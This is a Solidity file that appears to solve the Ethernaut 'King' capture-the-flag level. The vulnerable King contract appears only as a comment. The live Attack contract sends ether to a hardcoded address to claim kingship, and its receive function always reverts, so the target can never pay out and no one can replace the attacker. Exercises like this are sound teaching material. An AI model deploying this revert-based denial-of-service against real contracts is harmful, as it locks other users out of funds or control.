// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// contract King {

//   address payable king;
//   uint public prize;
//   address payable public owner;

//   constructor() public payable {
//     owner = msg.sender;  
//     king = msg.sender;
//     prize = msg.value;
//   }

//   receive() external payable {
//     require(msg.value >= prize || msg.sender == owner);
//     king.transfer(msg.value);
//     king = msg.sender;
//     prize = msg.value;
//   }

//   function _king() public view returns (address payable) {
//     return king;
//   }
// }

contract Attack {

    //King constant private target = King(0x91DF119E1dfb3108F3c1EBD172cFaa5056294837);

    function attack() public payable{
        payable(0x3783bCB8e31c6fB16ac2c40bBC26A618e5978A67).call{value:msg.value}("");
    }

    receive() external payable{
        revert();
    }
}